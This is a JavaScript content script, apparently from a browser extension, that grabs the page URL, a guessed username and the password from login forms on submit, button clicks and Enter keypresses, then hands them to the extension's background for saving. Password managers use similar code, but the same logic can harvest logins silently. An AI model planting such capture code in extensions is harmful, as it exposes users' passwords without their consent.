// Capture credentials on form submit, login button click, or Enter key
function captureCredentials() {
  const passwordFields = document.querySelectorAll('input[type="password"]');
  if (passwordFields.length === 0) return;

  let username = "";
  const possibleUsernameFields = document.querySelectorAll(
    'input[type="email"], input[type="text"], input[name*="user"], input[name*="login"], ' +
    'input[name*="email"], input[id*="user"], input[id*="login"], input[id*="email"]'
  );

  for (const field of possibleUsernameFields) {
    if (field.value && field.type !== "password") {
      username = field.value;
      break;
    }
  }

  const data = {
    url: window.location.href,
    username: username,
    password: passwordFields[0].value
  };

  if (data.password) {
    chrome.runtime.sendMessage({ action: "saveCredentials", data: data });
  }
}

// Form submit
document.addEventListener("submit", (e) => {
  if (e.target.querySelector('input[type="password"]')) {
    setTimeout(captureCredentials, 100);
  }
}, true);

// Login button clicks
document.addEventListener("click", (e) => {
  const target = e.target;
  if (target.tagName === "BUTTON" || 
      target.type === "submit" || 
      (target.tagName === "INPUT" && (target.type === "submit" || target.type === "button"))) {
    setTimeout(captureCredentials, 200);
  }
}, true);

// Enter key (common on login pages)
document.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    setTimeout(captureCredentials, 100);
  }
});